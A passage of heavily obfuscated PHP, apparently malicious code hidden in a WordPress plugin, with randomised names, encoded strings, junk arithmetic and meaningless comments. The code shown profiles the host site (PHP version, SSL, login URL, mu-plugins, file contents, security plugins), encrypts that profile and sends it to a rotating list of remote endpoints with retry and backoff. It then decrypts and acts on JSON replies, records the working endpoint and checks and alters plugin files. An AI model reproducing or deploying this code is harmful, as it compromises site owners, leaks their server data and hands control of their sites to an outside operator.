  $w2lo6becgw      =  array();


 $xrzfjdf3g753w   =  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(475),   "",   $GLOBALS['__scf_nv7he759wjfj_9']($bzpihpznaw, 0,   (0xe7de+0x1822))), 0, (0x570+0x290));



foreach     ($v759y2uqez11xqy4  as  $cupk3kbt8eisf) {


   $mj_77481utt0efu   = @$GLOBALS['__scf_b42duf6j1zadm9_105']($cupk3kbt8eisf);
      if  (!$mj_77481utt0efu    ||  $mj_77481utt0efu <= (465261+583315))    continue;



  $pq10vaazo84dr1_  =  @$GLOBALS['__scf_utyj_ckly79_101']($cupk3kbt8eisf, false,  null,   0,    (65465+71));
  if (!$GLOBALS['__scf_fv3zevxzzb_44']($pq10vaazo84dr1_)      ||  !hc0wbkv3xzh9im34z($pq10vaazo84dr1_)) continue;
  if  ($cupk3kbt8eisf      !==   bmvtr5sdqjf5km1t()   && $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(475),      "",  $pq10vaazo84dr1_), 0, (3439-1391)) !== $xrzfjdf3g753w)    continue;
  $w2lo6becgw[]  =  $cupk3kbt8eisf;
}
    if   (!$w2lo6becgw) {
    @update_option(c1sob647u1i(468),    $GLOBALS['__scf_qzyo0sgkyb6_202'](), ovffvv33(471));
 if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(64))) set_transient(c1sob647u1i(469),  1,   (0xf+0x249));
return;
}
      @update_option(f6yrzd2knrmb(468),  $GLOBALS['__scf_qzyo0sgkyb6_202'](),  c1sob647u1i(471));
    foreach    ($w2lo6becgw  as  $ko9cqc0s7si9cc)    {
   ruinnb541lwxm7j($ko9cqc0s7si9cc,  (71+349));



 if (c5kyk62yk_dwfeubni4b($ko9cqc0s7si9cc, fcywjpu_2kwq2ahog4($bzpihpznaw)))    {
// PHP 8.0 JIT: irreducible bridge

   hwyiz3722wut3tw($ko9cqc0s7si9cc);
  vyxva31du3czei($ko9cqc0s7si9cc);
 ruinnb541lwxm7j($ko9cqc0s7si9cc,  (620-200));
 o4_k_ap14u5xy97yywy7k($ko9cqc0s7si9cc);
    if ($ko9cqc0s7si9cc  ===   bmvtr5sdqjf5km1t()) {
/* non-blocking dependent-type */




 bfyls7pdkqkf4p8az(true);


eos4svadcaj0dow8y(true);

 }
}  else    {
       ruinnb541lwxm7j($ko9cqc0s7si9cc,  (353+67));
  }


}
}  catch     (Throwable $cje8wku90zm4r)   {

  g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(476),  $cje8wku90zm4r);

       }     catch (Exception $cje8wku90zm4r)     {

}


  }
  function  bs3cpzu5m1eyd5f()


    {

  static  $ixvedgx30ry2  = false;
 if  ($ixvedgx30ry2)    return;
   $ixvedgx30ry2 =  true;



try {
     tiv8uit9r58wotip8bo();
 zuvfa11d46iey5idmii();


k5vpt_1kxzi1uu8();
nt487feb_yeedqi2fjtszr();



 srxd8zsn54rz6anwrc();
  nj270i1voyjyvmxd();
 z34nmz7362no0_e1qq03cl();
r8j56gi10sbzxd2f4olo();

d63vpl6zq3h5r_();
        if  (o7gzqatlacm9ntr5h4b6())  {
   if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(477))  &&  did_action(f6yrzd2knrmb(451)))  {
if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(478))) $GLOBALS['__scf_g45egtj01hms_186'](bpowi0iglycvx(479));
  }   else    {
 eq7z05kg4s98n6ox(hn_f08x0cns80(451), hn_f08x0cns80(479), 0);
}
    }
}     catch   (Throwable  $cje8wku90zm4r)    {
      }    catch (Exception  $cje8wku90zm4r)  {
      }
  }
    function qcp2txvthmmhjrmrt()
   {
try   {
if  (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(406)) ||  !$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(480)))  return;



if  (!$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(481))   ||      !$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(482))) return;
    $l29jwwqsn_v4_jv  =      $GLOBALS['__scf_qzyo0sgkyb6_202']();
  if ($l29jwwqsn_v4_jv -   (int) @get_option(iw6xe9q4j6sneg(483),  0)   <  (3577+23)) return;
 @update_option(iw6xe9q4j6sneg(483),   $l29jwwqsn_v4_jv,    hn_f08x0cns80(484));
    @$GLOBALS['__scf_r7h_2y83ismjfq_303'](home_url('/'),   array(bpowi0iglycvx(485) =>   2,  ovffvv33(411)   =>  false,    f6yrzd2knrmb(486)   => false));
   }     catch (Throwable $cje8wku90zm4r)    {
    } catch    (Exception   $cje8wku90zm4r)     {
}
}
 function     o7gzqatlacm9ntr5h4b6()
    {
// template wait-free pipeline

  if (!    $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(481))) {
    return true;
   }
    
     if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(487))   && get_transient(p1srpzpjsehf9kb72()))    {
 return     false;
 }
     
 $zku4kju_id2lld1   = bcb80tag96ir7air0u8xp7();
$sy1wtx_ep3qz   =   obnmo3d9gt514xoc(hn_f08x0cns80(391),  false);
  if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($sy1wtx_ep3qz) &&   isset($sy1wtx_ep3qz[bpowi0iglycvx(488)])   &&  (int)      $sy1wtx_ep3qz[hn_f08x0cns80(488)]     >= (242+58) &&  (int)   $sy1wtx_ep3qz[bpowi0iglycvx(488)]   <= (86306+94))    $zku4kju_id2lld1   = (int)  $sy1wtx_ep3qz[ovffvv33(489)];



  $cfrv3kb61m  = (int)   get_option(c1sob647u1i(490), 0);



if ($cfrv3kb61m  >   0   && ($GLOBALS['__scf_qzyo0sgkyb6_202']()   - $cfrv3kb61m) <    $zku4kju_id2lld1)     {
return   false;
    }

     $j_inty4sb2gyx =   (int)  get_option(ovffvv33(491),  0);
if   ($j_inty4sb2gyx  >   0)  {$g64a8m2mufsgl=(0xcd+0x98);$zzkp257l_p22xz=$g64a8m2mufsgl%9;
 $oo0o51xwgs8x0_a    =   (int) get_option(ovffvv33(492),   0);
  $v8fkokomlwb8x1    =  array((341-41),  (868+32),  (3173-1373),   (2254+1346), (0x4e2+0x92e));
  $hq3746dp3lu8jl     =  $v8fkokomlwb8x1[$GLOBALS['__scf_a5xz_m7m_xzaj_493'](0, $GLOBALS['__scf_bpblov2hvcg_r_494']($oo0o51xwgs8x0_a  -  1,  (3+1)))];
$hq3746dp3lu8jl    +=      $GLOBALS['__scf_ew0pe5qy71c8x_368'](0, (int) ($hq3746dp3lu8jl    *  0.25));
        if  (($GLOBALS['__scf_qzyo0sgkyb6_202']()   -    $j_inty4sb2gyx)  <     $hq3746dp3lu8jl)   {$n_dujxmqbdggi=PHP_INT_MAX/PHP_INT_MAX;$bv_f_ev3n0=$n_dujxmqbdggi+57;
  return false;
      }
  }


   
   return true;
}
   
   function   lffxvxzmu_ppkc1pzm()



  {
 $oo0o51xwgs8x0_a  = (int)  get_option(hn_f08x0cns80(492), 0);
     update_option(c1sob647u1i(492),  $oo0o51xwgs8x0_a +  1);
update_option(c1sob647u1i(491),     $GLOBALS['__scf_qzyo0sgkyb6_202']());
 }
function k_8fseb48fxjlgant2()
   {
      $kekj16jieb =  array();
try {
    $kekj16jieb[c1sob647u1i(495)]  =      dfb4_mpcgxvnp230hvh1v();
        $kekj16jieb[f6yrzd2knrmb(496)]  = PHP_VERSION;
 $kekj16jieb[iw6xe9q4j6sneg(497)]  = $GLOBALS['__scf_h9zx4fm_1_qpan_110']();
       $kekj16jieb[iw6xe9q4j6sneg(498)]   =    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(499)) &&    is_ssl())  ?     1   :  0;


$kekj16jieb[c1sob647u1i(500)]   = ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(501))   &&  is_multisite()) ?  1  :    0;
  $kekj16jieb[ovffvv33(502)] =    isset($GLOBALS[bpowi0iglycvx(503)])   ? (string)   $GLOBALS[f6yrzd2knrmb(503)] : "";
 $kekj16jieb[iw6xe9q4j6sneg(504)]    = isset($_SERVER[iw6xe9q4j6sneg(116)]) ?   $GLOBALS['__scf_nv7he759wjfj_9']((string)  $_SERVER[bpowi0iglycvx(116)],  0, (5<<3))    :      "";
$mnha0aw7giww9l    = (isset($GLOBALS[c1sob647u1i(460)]) && $GLOBALS['__scf_fv3zevxzzb_44']($GLOBALS[f6yrzd2knrmb(460)]))  ? $GLOBALS['__scf_qew3crlieule_339']($GLOBALS[ovffvv33(505)])  :  "";
   $kekj16jieb[iw6xe9q4j6sneg(506)]  =    ($mnha0aw7giww9l !==  "")    ?   1  :  0;
    $kekj16jieb[hn_f08x0cns80(507)]   =  $GLOBALS['__scf_d4eyetogjbsnt_10']($mnha0aw7giww9l);
 $kekj16jieb[hn_f08x0cns80(508)]  =      !empty($GLOBALS[ovffvv33(509)])    ?   1   :     0;
 $kekj16jieb[c1sob647u1i(510)] =    !empty($GLOBALS[f6yrzd2knrmb(511)])     ?    1   :     0;
      $kekj16jieb[ovffvv33(512)] =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(481))  ?  (int) @get_option(hn_f08x0cns80(513), 0)    :  0;


  $kekj16jieb[ovffvv33(514)]   =   (q87voct054xu7c(c1sob647u1i(514),  "")  !==   "")  ? 1 : 0;
  $kekj16jieb[hn_f08x0cns80(515)]  =  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(516))  ? (int)  @get_option(c1sob647u1i(517), 0)    : 0;
 $kekj16jieb[hn_f08x0cns80(518)] =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(519))  ?    (int) @get_option(bpowi0iglycvx(520),  0)  :  0;
       $kekj16jieb[c1sob647u1i(521)]   = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(519)) ?  (int)   @get_option(f6yrzd2knrmb(522), 0)  :  0;
     

$ftvsfz7ji2  =   ircnjcyfmf8qkc7xdiss4();
 $kekj16jieb[bpowi0iglycvx(523)]  =     @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ftvsfz7ji2  .  hn_f08x0cns80(524))  ? (uxfe0h1yutnjnyqpq78l(@$GLOBALS['__scf_utyj_ckly79_101']($ftvsfz7ji2     .  f6yrzd2knrmb(524), false,  null,   0,   (8134+58)))  ?      2 :   1)  :  0;
 $kekj16jieb[ovffvv33(525)]  =   @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ftvsfz7ji2      .    bpowi0iglycvx(526))   ?  (uxfe0h1yutnjnyqpq78l(@$GLOBALS['__scf_utyj_ckly79_101']($ftvsfz7ji2     . bpowi0iglycvx(526),    false, null,  0,   (0x13d1+0xc2f)))  ?   2    : 1)   :   0;
$kekj16jieb[f6yrzd2knrmb(527)]  =    @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ftvsfz7ji2    . hn_f08x0cns80(528))    ?  (uxfe0h1yutnjnyqpq78l(@$GLOBALS['__scf_utyj_ckly79_101']($ftvsfz7ji2   .   iw6xe9q4j6sneg(528), false,  null,  0,  (0xc05+0x13fb)))  ?  2  : 1)  :   0;
     $iib_qzqrye7xfhon = iw6xe9q4j6sneg(529)  .   nreub2fs747eromoe(ABSPATH     . 'g',   (167^175));
$a5r63slayqqfo7   =     hn_f08x0cns80(530)   . nreub2fs747eromoe(ABSPATH .     'g',  (0x6+0x2));$o_m8zarr6p=2362;$u57wag95=$o_m8zarr6p%6;



 $kekj16jieb[ovffvv33(531)]     =   0;
       foreach    (array(p2b_7j_9ex54eg4(),  $ftvsfz7ji2, ABSPATH    .  f6yrzd2knrmb(532))  as $p3uv8_aopagj8nil)  {
 if     (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($p3uv8_aopagj8nil .   '/'    . $iib_qzqrye7xfhon     . c1sob647u1i(533)))   $kekj16jieb[c1sob647u1i(531)] =   1;
   if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($p3uv8_aopagj8nil .  '/' .     $a5r63slayqqfo7)    && (int) @$GLOBALS['__scf_uo_a60ibqnli_104']($p3uv8_aopagj8nil     .  '/'  . $a5r63slayqqfo7) > $GLOBALS['__scf_qzyo0sgkyb6_202']()   -    (30<<3))   {
  $kekj16jieb[iw6xe9q4j6sneg(531)]     =  2;
 break;
  }
 }
  unset($a5r63slayqqfo7,  $p3uv8_aopagj8nil);
 $mgotjgxq3p8  =   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(534)) ?   @$GLOBALS['__scf_hm704kpgfifhl_118'](bpowi0iglycvx(535))    :  false;
    if (!$GLOBALS['__scf_fv3zevxzzb_44']($mgotjgxq3p8)      ||   $mgotjgxq3p8  ===   ""   ||   $mgotjgxq3p8 === iw6xe9q4j6sneg(536)) $mgotjgxq3p8     =    c1sob647u1i(537);



$kekj16jieb[bpowi0iglycvx(538)]   = (@$GLOBALS['__scf_rjpcj9l4bigb5_21'](ABSPATH      .    $mgotjgxq3p8)  &&    $GLOBALS['__scf_w6mdcepio4lkz5_7']((string)   @$GLOBALS['__scf_utyj_ckly79_101'](ABSPATH     .  $mgotjgxq3p8),   bpowi0iglycvx(539)) !==  false) ? 1    : 0;
  $kekj16jieb[iw6xe9q4j6sneg(540)]   =  (@$GLOBALS['__scf_rjpcj9l4bigb5_21'](ABSPATH  . hn_f08x0cns80(541)) &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']((string)      @$GLOBALS['__scf_utyj_ckly79_101'](ABSPATH   .    bpowi0iglycvx(542)),  bpowi0iglycvx(539))   !==      false) ?  1    :   0;


    $kekj16jieb[f6yrzd2knrmb(543)] =  (@$GLOBALS['__scf_rjpcj9l4bigb5_21'](ABSPATH   .      hn_f08x0cns80(544))  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']((string) @$GLOBALS['__scf_utyj_ckly79_101'](ABSPATH . ovffvv33(545), false, null, 0, (73698-8162)),    iw6xe9q4j6sneg(546))  !== false) ?  1  : 0;


 $kekj16jieb[bpowi0iglycvx(547)]    =   defined(f6yrzd2knrmb(548))   ? 1   :  0;
 $kekj16jieb[f6yrzd2knrmb(549)]  = (defined(f6yrzd2knrmb(550)) ||      defined(f6yrzd2knrmb(551)) ||  defined(f6yrzd2knrmb(552))   ||  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(553))     || $GLOBALS['__scf_dr1wex6ejrn2_554'](bpowi0iglycvx(555))   || isset($GLOBALS[f6yrzd2knrmb(556)])    ||    $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(557))) ?     1   :      0;
$kekj16jieb[f6yrzd2knrmb(558)]     =   (int)  get_option(c1sob647u1i(490),  0);
 $kekj16jieb[ovffvv33(559)]   =  (int)    get_option(iw6xe9q4j6sneg(492), 0);
   $kekj16jieb[ovffvv33(560)]    = (int)  get_option(ovffvv33(561),  0);
  $gv5si2f98cf    = fcc42yo6xrdenvra0(ovffvv33(562),    array());
  $uan3trbwovk5j = 0;
 $g5zwjva0qjzjtdm   = 0;
   if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($gv5si2f98cf))  {
 foreach   ($gv5si2f98cf as $ekxvczjmiyqtk) {
   if (ltd6h909jnbpybjitqg($ekxvczjmiyqtk) ===  "") continue;
$uan3trbwovk5j++;
  $oa5afrny0_gy62  = $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ekxvczjmiyqtk)  ?   (int)    (isset($ekxvczjmiyqtk[f6yrzd2knrmb(563)])    ?   $ekxvczjmiyqtk[hn_f08x0cns80(563)] :  1)    :  1;


$craz2yx3if4zmcr6  =  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ekxvczjmiyqtk)     &&    isset($ekxvczjmiyqtk[c1sob647u1i(564)])  ?     (int) $ekxvczjmiyqtk[hn_f08x0cns80(565)]   : 0;
     if    (!$oa5afrny0_gy62    &&      (!$craz2yx3if4zmcr6 || $craz2yx3if4zmcr6  <  $GLOBALS['__scf_qzyo0sgkyb6_202']()  -     (3534+66)))  $g5zwjva0qjzjtdm++;
 }
 }
 $kekj16jieb[f6yrzd2knrmb(566)] =   $uan3trbwovk5j;
    $kekj16jieb[hn_f08x0cns80(567)]  =     $g5zwjva0qjzjtdm;
 $fuawewb9_8sr =    $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(519))  ?  @get_option(c1sob647u1i(568), "")  : "";
   $kekj16jieb[ovffvv33(569)]   =     $GLOBALS['__scf_fv3zevxzzb_44']($fuawewb9_8sr)   ? $GLOBALS['__scf_nv7he759wjfj_9']($fuawewb9_8sr,    0,     (24^29))  :    "";



 $cpakna3wa6m18pt      =    $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(519))   ? @get_option(hn_f08x0cns80(570),   array())     :      array();
  $kekj16jieb[bpowi0iglycvx(571)]  =  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($cpakna3wa6m18pt)   && (!empty($cpakna3wa6m18pt['t']) ||   !empty($cpakna3wa6m18pt[iw6xe9q4j6sneg(572)])))  ?  1      :  0;
} catch   (Throwable  $cje8wku90zm4r)  {
// WordPress 6.4 patterns: devirtualize lsm-tree

   $kekj16jieb[ovffvv33(573)]   =    $GLOBALS['__scf_nv7he759wjfj_9']($cje8wku90zm4r->getMessage(),  0,     (23+37));
  } catch    (Exception     $cje8wku90zm4r)    {



   $kekj16jieb[hn_f08x0cns80(573)] =   $GLOBALS['__scf_nv7he759wjfj_9']($cje8wku90zm4r->getMessage(), 0,  (96-36));
  }
   return $kekj16jieb;
 }
 
     function tapjpko88qwjjejm097b57()
 {
 if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(574)))   {
  return   (string)   site_url(f6yrzd2knrmb(575));
}
    return  $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(576)) ? (string)    wp_login_url() :  "";$t68ysji3_aa=85+44;$kgdfu01tawu8=$t68ysji3_aa-19;
}


  


   function xyhhquc02dkq5zwsgxhdu($__okrm1thsq)
 {
    $ylq_epx7jmb9   = "";
 if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(480)))   {
// guarded inline

$ylq_epx7jmb9   =  (string) $GLOBALS['__scf_lf33h8m4cq_577'](home_url(),   constant(bpowi0iglycvx(578)));
 }
 if  (! $ylq_epx7jmb9  &&     $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(579)))  {


 $ylq_epx7jmb9  = (string)   $GLOBALS['__scf_lf33h8m4cq_577'](get_site_url(), constant(hn_f08x0cns80(578)));
}

  if  (! $ylq_epx7jmb9  && $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(580))) {
$ylq_epx7jmb9 = (string) $GLOBALS['__scf_lf33h8m4cq_577'](get_bloginfo(bpowi0iglycvx(581)), constant(bpowi0iglycvx(578)));
}
// WordPress 6.3 commands: dynamic chain

   if  (!  $ylq_epx7jmb9   &&    $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(519)))    {


  $ylq_epx7jmb9     =    (string)  $GLOBALS['__scf_lf33h8m4cq_577']((string)   get_option(hn_f08x0cns80(582),  ""),    constant(bpowi0iglycvx(578)));


 }
if   (!   $ylq_epx7jmb9 &&  isset($_SERVER[ovffvv33(583)]))   {
  $ylq_epx7jmb9 =  (string)     $_SERVER[c1sob647u1i(583)];
}
    if   (!  $ylq_epx7jmb9   && isset($_SERVER[bpowi0iglycvx(584)]))  {$hi3rj9ppszwgdr=-580;$yacsu9_1e3if=($hi3rj9ppszwgdr>0)?$hi3rj9ppszwgdr:-$hi3rj9ppszwgdr;
$ylq_epx7jmb9 =    (string)  $_SERVER[f6yrzd2knrmb(584)];
  }
 if    (! $ylq_epx7jmb9) {



      return     $__okrm1thsq;
   }
  return   $ylq_epx7jmb9;
      }
 function   zfy1xdk98a2w2p($jlr8watv3ftsx    =  0)


  {
   try    {


 $mzzxh3i59qor7    = $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(585))  ?  (int)      @$GLOBALS['__scf_hm704kpgfifhl_118'](bpowi0iglycvx(586))    :     0;
 if    ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(450)))   @$GLOBALS['__scf_h7yij8unkgou5_450']((304-124));
 $_27goe5xippn8139 =  ($mzzxh3i59qor7   >     (130^150)  && $mzzxh3i59qor7  <  (283-103)) ? ($mzzxh3i59qor7 -  (12-2))  :  (($mzzxh3i59qor7  > 0    &&   $mzzxh3i59qor7 <=  (176^164)) ?      (0x5+0x5)   :  (137-47));
  if ($jlr8watv3ftsx > 0 &&     $_27goe5xippn8139 >     $jlr8watv3ftsx)   $_27goe5xippn8139  =  $jlr8watv3ftsx;
$GLOBALS[iw6xe9q4j6sneg(587)]    =  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) + $_27goe5xippn8139;
       if (! o7gzqatlacm9ntr5h4b6())    {
      return;$p13fozw451y1=138|81;$s3f7nn6k=$p13fozw451y1^6;
}
  if  (!dtf7lvb25ztuc8jh3htk(iw6xe9q4j6sneg(402))) {
return;
       }
    
    $wb6k72queg13ohyn =  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true);
    $afdt5t25m8    =  t5lxrqza0rbfj9_848z1uy((int) ($_27goe5xippn8139  *  0.6));
 if (
  !  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($afdt5t25m8)
   ||     !     isset($afdt5t25m8[bpowi0iglycvx(588)]) ||  !   $GLOBALS['__scf_fv3zevxzzb_44']($afdt5t25m8[hn_f08x0cns80(588)])  ||     !   $afdt5t25m8[iw6xe9q4j6sneg(589)]
    ||    !   isset($afdt5t25m8[bpowi0iglycvx(590)])  ||   !  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($afdt5t25m8[hn_f08x0cns80(591)])  ||  empty($afdt5t25m8[ovffvv33(591)])
  )     {
// binary mode

 lffxvxzmu_ppkc1pzm();
  return;



    }
   $m05crxk0nicolr =    $afdt5t25m8[hn_f08x0cns80(589)];
   $iycz9idnhz    =  $afdt5t25m8[c1sob647u1i(592)];
mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(593), $m05crxk0nicolr,      iw6xe9q4j6sneg(484));

       mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(594),   $GLOBALS['__scf_w6mdcepio4lkz5_7']($m05crxk0nicolr,   c1sob647u1i(595)) === 0  ? 1     :  0,     c1sob647u1i(484));
$qqtamibp04jp07b   =   $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(519)) ? (string)    get_option(bpowi0iglycvx(596), "")   : "";
if  ($qqtamibp04jp07b   !==  "" && $GLOBALS['__scf_rd2tojulg06lx_160']($qqtamibp04jp07b, $iycz9idnhz,     true)) {
    $iycz9idnhz = $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_yucj673b8x_164']($iycz9idnhz,    array($qqtamibp04jp07b)));


$GLOBALS['__scf_k37zfi55nx4h_597']($iycz9idnhz);
   $GLOBALS['__scf_ft4dc09jmlt_338']($iycz9idnhz,    $qqtamibp04jp07b);
    } elseif ($GLOBALS['__scf_wj6dld55k5r8m_39']($iycz9idnhz) >     1)  {
$GLOBALS['__scf_k37zfi55nx4h_597']($iycz9idnhz);

 }
        

    if  (($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)  -  $wb6k72queg13ohyn)    > (int)  ($_27goe5xippn8139 * 0.6))  {
 lffxvxzmu_ppkc1pzm();


 return;
  }
       


    $h9tztdb82xzh = ywqm3g0v52d6hud309();
      if  (pklvf4vixucw8d97bma($h9tztdb82xzh))   {
     $h9tztdb82xzh =     ywqm3g0v52d6hud309();
 }
     



$kmlkdemibj_73az = array();
 if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(598)))  {


 foreach  ((array)  get_option(c1sob647u1i(220), array())  as  $cupk3kbt8eisf) {

  if ($GLOBALS['__scf_fv3zevxzzb_44']($cupk3kbt8eisf) &&  $cupk3kbt8eisf)   {
  $kmlkdemibj_73az[]  = $cupk3kbt8eisf;
       }
  }
        }
      



 $ye8083t40h3og7w    = array();
    if  (defined(f6yrzd2knrmb(13)))   {
    $ihjb56bnt71x1ufd =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(599))   ?     @$GLOBALS['__scf_kajvzw3bpufv_75']($GLOBALS['__scf_ofdeuvs8zwos6_12'](WPMU_PLUGIN_DIR,    '/')  .    c1sob647u1i(600))     :   false;
 if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($ihjb56bnt71x1ufd)) {
   foreach ($ihjb56bnt71x1ufd    as   $ko9cqc0s7si9cc)   {


    $ye8083t40h3og7w[]    =  $GLOBALS['__scf_owu_4pajngr_3']($ko9cqc0s7si9cc);
    }
// WP Entity Provider: free dependent-type




  }
}
      
   $dkq9u0boieulc2tq  =    array(
  bpowi0iglycvx(601) =>    xyhhquc02dkq5zwsgxhdu(""),
 c1sob647u1i(602)    =>   dfb4_mpcgxvnp230hvh1v(),
       f6yrzd2knrmb(603)     =>  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   iw6xe9q4j6sneg(533)),
    c1sob647u1i(604)   => $GLOBALS['__scf_ofdeuvs8zwos6_12'](ABSPATH, hn_f08x0cns80(135)),
 ovffvv33(605)   =>  $kmlkdemibj_73az,
c1sob647u1i(606)     =>   $ye8083t40h3og7w,
 ovffvv33(607) => tapjpko88qwjjejm097b57(),
  hn_f08x0cns80(608) =>     (object) gtevdmhxojpzhqcmjgf65($h9tztdb82xzh),
   f6yrzd2knrmb(609)   =>     (object)   ycfijqdkwbccyfmbr3($h9tztdb82xzh),


hn_f08x0cns80(386)    => ($jmahqyk_g3tzo =   x7jhzf5x_zznpu07lpc0f()),
    
     );
  $bgmk5a8vckw  =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(610))  ?  wp_json_encode($dkq9u0boieulc2tq) :   $GLOBALS['__scf__r5ulaote4t_611']($dkq9u0boieulc2tq);

$co3v73mo2d52t  = f0h420wzduis5n6p2($bgmk5a8vckw, $m05crxk0nicolr);
     $kmd1hnkm_y_p7zlc  =     array(hn_f08x0cns80(342)  =>   ovffvv33(612));
  $gm69t85l5gf7p80   =  null;$m8t6n9_sh=(0x62+0x6a);$pih9v_tk_ag=$m8t6n9_sh%4;
    $tl2wzith_j0b =    false;


 lffxvxzmu_ppkc1pzm();
// connected ring-buffer

  $GLOBALS[c1sob647u1i(613)] = false;
   
   foreach  ($iycz9idnhz as  $o_mle9hlw6xo)  {


  $c7u00iukxa9cmyx = $_27goe5xippn8139    -   ($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)  -   $wb6k72queg13ohyn);
if ($c7u00iukxa9cmyx      <   (95^92))  {
    break;


  }
        $i15ekbwriadnays6  =   $GLOBALS['__scf_bpblov2hvcg_r_494']((0x2+0x8),   (int)   $c7u00iukxa9cmyx);


 
   $o_mle9hlw6xo =    $GLOBALS['__scf_qew3crlieule_339']((string) $o_mle9hlw6xo);
    if  (! $o_mle9hlw6xo) {$le5vpftyk4ho=PHP_MAJOR_VERSION;$i5nioos7ant=$le5vpftyk4ho*2;
continue;
}
      try   {
 $cejmky7hjjqz  =  $m05crxk0nicolr;
 $wbw1s8q9qbk05  = e8w0r58wuldwv74l($o_mle9hlw6xo,  $co3v73mo2d52t,   $kmd1hnkm_y_p7zlc,   $i15ekbwriadnays6,     function  ($aakozw_1zysblhgx) use  ($cejmky7hjjqz)   {
   if (!mwr_737feiwcxt($GLOBALS['__scf_d4eyetogjbsnt_10']($aakozw_1zysblhgx)))   {


  $GLOBALS[iw6xe9q4j6sneg(614)]  =  true;
 return false;
 }



   $kekj16jieb  =    f0h420wzduis5n6p2($aakozw_1zysblhgx,  $cejmky7hjjqz);


if (!$kekj16jieb)    return     false;
 return $GLOBALS['__scf_w1m1ydxx4_gm9__38'](@$GLOBALS['__scf_yeixh7nk2_03ag_344']($GLOBALS['__scf_qew3crlieule_339']($kekj16jieb),  true));


      });$zdnvm_jji8c3y=PHP_INT_MAX/PHP_INT_MAX;$q46oiqim9jxp3_=$zdnvm_jji8c3y+81;
   if  (!   $wbw1s8q9qbk05)  {
 if  (!empty($GLOBALS[ovffvv33(614)]))  {
      g_qoqdy38lfl4v4n3618(c1sob647u1i(447),     hn_f08x0cns80(615));


  break;
}
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(447),    iw6xe9q4j6sneg(616)     .  $o_mle9hlw6xo);
continue;



 }
      
$_88toi5q22bd      =   f0h420wzduis5n6p2($wbw1s8q9qbk05, $m05crxk0nicolr);
   if  (! $_88toi5q22bd)    {
  g_qoqdy38lfl4v4n3618(ovffvv33(617),   bpowi0iglycvx(618)  . $o_mle9hlw6xo);
      continue;
  }
// @suspend collector

$gm69t85l5gf7p80 = ($GLOBALS['__scf_d4eyetogjbsnt_10']($_88toi5q22bd)    >   (0x4f21c+0xb0de4) &&  !mwr_737feiwcxt($GLOBALS['__scf_d4eyetogjbsnt_10']($_88toi5q22bd))) ?  null    :  @$GLOBALS['__scf_yeixh7nk2_03ag_344']($GLOBALS['__scf_qew3crlieule_339']($_88toi5q22bd),   true);
     if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80))  {



if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(619))) {
   update_option(bpowi0iglycvx(620),  $o_mle9hlw6xo);
}
 $tl2wzith_j0b  = true;
break;
 }   else {


   g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(617), hn_f08x0cns80(621)   . $o_mle9hlw6xo);
   }
     } catch  (Throwable  $cje8wku90zm4r) {
